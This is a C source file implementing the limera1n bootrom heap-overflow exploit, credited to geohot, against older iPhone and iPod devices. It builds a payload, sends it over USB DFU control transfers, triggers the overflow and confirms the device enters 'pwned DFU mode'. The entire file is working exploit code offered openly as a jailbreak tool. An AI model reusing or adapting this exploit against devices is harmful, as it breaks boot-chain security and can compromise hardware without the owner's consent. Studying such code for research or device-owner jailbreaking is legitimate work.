/*
 * limera1n.c
 * copyright (C) 2020/01/22 dora2ios
 *
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <http://www.gnu.org/licenses/>.
 *
 */

#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "ircv.h"
#include "limera1n.h"

static int empty(void){
    return 0;
}
#ifdef HAVE_DEBUG
#define DEBUG_(...) printf(__VA_ARGS__)
#else
#define DEBUG_(...) empty()
#endif


// usb
static int send_data(irecv_client_t client, unsigned char* data, size_t size){
    return irecv_usb_control_transfer(client, 0x21, 1, 0, 0, data, size, 100);
}

int i3gs_bootrom(const struct irecv_device_info *devinfo) {
    if (devinfo) {
        int i3gs = strcasecmp(devinfo->srtg, "iBoot-359.3");
        if(i3gs == 0) {
            return 0; // oldBR
        }
        return 1; // newBR
    }
    
    printf("ERROR: Failed to get device info.\n");
    return -1;
}


// payload
int limera1n_exploit(irecv_client_t client, irecv_device_t device_info, const struct irecv_device_info *info) {
#ifdef HAVE_DEBUG
    printf("** exploiting with limera1n\n");
    printf("*** based on limera1n exploit (heap overflow) by geohot\n");
#else
    printf("exploiting with limera1n\n");
    printf("* based on limera1n exploit (heap overflow) by geohot\n");
#endif
    
    info = irecv_get_device_info(client);
    char* pwnd_str = strstr(info->serial_string, "PWND:[");
    if(pwnd_str) {
        printf("Device already in pwned DFU mode.\n");
        irecv_close(client);
        return -1;
    }
    
    unsigned char *payload;
    size_t payload_len;
    unsigned char assert[1];
    unsigned char buf[0x800];
    memset(buf, 'A', 0x800);
    int r;
    int rom;
    
    if(info->cpid == 0x8920){
        DEBUG_("Detected iPhone 3GS. Checking the Bootrom version.\n");
        rom = i3gs_bootrom(info); // 0:old, 1:new
        if(rom == -1){
            printf("ERROR: Failed to check bootrom version\n");
            return -1;
        }
        if(rom == 0){
            DEBUG_("Bootrom: old\n");
        }
        if(rom == 1){
            DEBUG_("Bootrom: new\n");
        }
    }
    
    if(info->cpid != 0x8920){
        rom = 2;
    }
    
    if(info->cpid == -1){
        printf("ERROR: Failed to get device infomation.\n");
        return -1;
    }
    
    r = gen_limera1n(info->cpid, rom, &payload, &payload_len);
    if(r == -1) {
        printf("ERROR: Failed to generate payload.\n");
        irecv_close(client);
        return -1;
    }
    
    DEBUG_("Sending exploit payload\n");
    
    r = send_data(client, payload, payload_len);
    if(r != payload_len){
        printf("ERROR: Failed to send payload.\n");
        irecv_close(client);
        return -1;
    }
    
    DEBUG_("Sending fake data\n");
    r = irecv_usb_control_transfer(client, 0xA1, 1, 0, 0, assert, 1, 100);
    if(r != 1){
        printf("ERROR: Exploit failed! device is NOT in pwned DFU mode.\n");
        irecv_close(client);
        return -1;
    }
    
    r = irecv_usb_control_transfer(client, 0x21, 1, 0, 0, buf, 0x800, 10);
    if(r != IRECV_E_TIMEOUT){
        printf("ERROR: Failed to send buf.\n");
        irecv_close(client);
        return -1;
    }
    
    DEBUG_("Executing exploit\n");
    r = irecv_usb_control_transfer(client, 0x21, 2, 0, 0, NULL, 0, 100);
    if(r != IRECV_E_TIMEOUT){
        printf("ERROR: Failed to execute exploit.\n");
        irecv_close(client);
        return -1;
    }
    
    irecv_reset(client);
    
    DEBUG_("Reconnecting to device\n");
    irecv_close(client);
    client = NULL;
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("ERROR: Failed to reconnect to device.\n");
        irecv_close(client);
        return -1;
    }
    
    r = irecv_finish_transfer(client);
    if(r != 0){
        printf("ERROR: Failed to finish transfer.\n");
        irecv_close(client);
        return -1;
    }
    
    DEBUG_("Exploit sent\n");
    
    DEBUG_("Reconnecting to device\n");
    irecv_close(client);
    client = NULL;
    irecv_open_with_ecid_and_attempts(&client, 0, 5);
    if(!client) {
        printf("ERROR: Failed to reconnect to device.\n");
        irecv_close(client);
        return -1;
    }
    
    free(payload);
    
    info = irecv_get_device_info(client);
    pwnd_str = strstr(info->serial_string, "PWND:[");
    if(!pwnd_str) {
        printf("ERROR: Device not in pwned DFU mode.\n");
        irecv_close(client);
        return -1;
    }
    printf("\x1b[31;1mDevice is now in pwned DFU mode!\n");
    irecv_close(client);
    return 0;
}
